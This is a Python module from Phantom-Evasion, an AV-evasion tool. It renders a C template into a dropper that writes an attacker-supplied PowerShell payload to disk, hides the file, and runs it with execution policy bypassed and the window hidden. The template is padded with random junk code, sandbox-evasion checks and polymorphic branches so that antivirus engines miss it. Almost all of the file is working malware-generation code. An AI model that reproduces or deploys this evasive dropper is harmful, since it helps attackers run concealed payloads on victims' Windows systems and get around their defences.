
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import pystache
import random
import string
import sys 
from random import shuffle
sys.path.append("Modules/payloads/auxiliar")
import usefull

template_args = {} # Dictionnary containing all keys/values for template rendering

Powershell_Script = usefull.powershell_adjust(sys.argv[1]) + ";\n"
template_args['Powershell_Script'] = Powershell_Script

Filename = sys.argv[2]

template_args['Randcmdvarname'] = usefull.varname_creator()

template_args['Randpshvarname'] = usefull.varname_creator()

template_args['Randscriptname'] = usefull.varname_creator() + ".ps1"

template_args['Randfileptr'] = usefull.varname_creator()

template_args['Randattr'] = usefull.varname_creator()

template_args['Junkcode1'] = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
template_args['Junkcode2'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode3'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode4'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode5'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode6'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode7'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode8'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode9'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode

template_args['Win_eva1'] = usefull.windows_evasion(str(random.randint(1,5)))
template_args['Win_eva2'] = usefull.windows_evasion(str(random.randint(1,5)))
template_args['Win_eva3'] = usefull.windows_evasion(str(random.randint(1,5)))
template_args['Win_eva4'] = usefull.windows_evasion(str(random.randint(1,5)))


template_args['MorphEvasion1'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
template_args['MorphEvasion2'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
template_args['MorphEvasion3'] = str(usefull.Polymorph_Multipath_Evasion(str(random.randint(1,7)),Filename))
 
Hollow_code = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <math.h>

int main(int argc,char * argv[]){
    {{{Junkcode1}}
    {{{Win_eva1}}}
    {{{Win_eva2}}}
    {{{Win_eva3}}}
    {{{Win_eva4}}}
    {{{Junkcode2}}}
    {{{MorphEvasion1}}}
        {{{MorphEvasion2}}}
            {{{MorphEvasion3}}}
                {{{Junkcode3}}}
                char {{{Randpshvarname}}}[] = {{{Powershell_Script}}} 
                char {{{Randcmdvarname}}}[] = \"powershell -executionpolicy bypass -WindowStyle Hidden -Noexit -File {{{Randscriptname}}}\";
                FILE *{{{Randfileptr}}} = fopen(\"{{{Randscriptname}}}\",\"w\");
                fputs({{{Randpshvarname}}},{{{Randfileptr}}});
                fclose({{{Randfileptr}}});
                DWORD {{{Randattr}}} = GetFileAttributes(\"{{{Randscriptname}}}\");
                SetFileAttributes(\"{{{Randscriptname}}}\",{{{Randattr}}} + FILE_ATTRIBUTE_HIDDEN);
                {{{Junkcode4}}}
                {{{Junkcode5}}}
                system({{{Randcmdvarname}}});
                remove(\"{{{Randscriptname}}}\");
            }else{
                {{{Junkcode6}}}
            }
        }else{
            {{{Junkcode7}}}
        }
    }else{
        {{{Junkcode8}}}
    }
    }}
    {{{Junkcode9}}}
    }}
    return 0;
}
"""

Hollow_code = pystache.render(Hollow_code, template_args)

with open('Source.c','wb') as f:
    f.write(Hollow_code)


